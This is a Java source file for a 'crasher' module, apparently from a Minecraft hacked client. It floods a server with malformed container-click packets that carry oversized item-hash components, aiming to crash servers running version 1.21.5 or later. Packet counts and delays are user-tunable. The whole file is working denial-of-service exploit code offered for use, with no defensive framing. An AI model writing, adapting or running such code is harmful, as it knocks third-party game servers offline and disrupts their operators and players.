package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.protocol.components.objects.HashStack;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class Smite1 implements Crasher {
    private static final String METHOD_NAME = "Smite1";
    private boolean enabled = false;
    private ScheduledExecutorService executorService;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int compSize = Integer.parseInt(args[3]);
        int delCompSize = Integer.parseInt(args[4]);
        int mapSize = Integer.parseInt(args[5]);
        int threadSleep = Integer.parseInt(args[6]);
        long loopAmount = Long.parseLong(args[7]);
        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            msgHelper.sendMessage("Previous attack &cstopped&7!", true);
        }

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (protocol >= 770) {
            PacketContainerClick packet = new PacketContainerClick(protocol, 0, 1, 37,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM,
                    PacketContainerClick.ContainerAction.LEFT_CLICK,
                    new HashStack(compSize, delCompSize),
                    mapSize
            );

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!enabled || check.get() >= loopAmount || (mc.getConnection() == null || !mc.getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
                    return;
                }
                PacketCodec.sendPacket(packet, packets);
                check.getAndIncrement();
            };
            executorService.scheduleWithFixedDelay(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.5+ (Protocol: 770+)&7, and your current protocol is &c" + protocol, true);
        }
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[1312], size1[256], size2[256], count[128], thread-sleep[1500], loop-amount[10]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size1", OptionType.INTEGER),
                new OptionUtil("Size2", OptionType.INTEGER),
                new OptionUtil("Count", OptionType.INTEGER),
                new OptionUtil("Thread Sleep", OptionType.INTEGER),
                new OptionUtil("Loop Amount", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "HashStack Overload Crasher [1.21.5+]";
    }
}
